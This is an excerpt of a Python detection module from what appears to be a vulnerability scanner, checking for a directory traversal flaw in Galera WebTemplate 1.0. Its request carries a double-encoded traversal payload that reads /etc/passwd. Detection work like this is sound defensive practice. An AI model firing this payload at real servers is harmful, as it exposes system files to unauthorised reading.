...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Galera WebTemplate 1.0 Directory Traversal Detection',
        ...
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'lfi', 'galera', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/GallerySite/filesrc/fotoilan/388/middle//.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd', allow_redirects=False)
        ...
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='critical',
                reason="Galera WebTemplate 1.0 Directory Traversal detected",
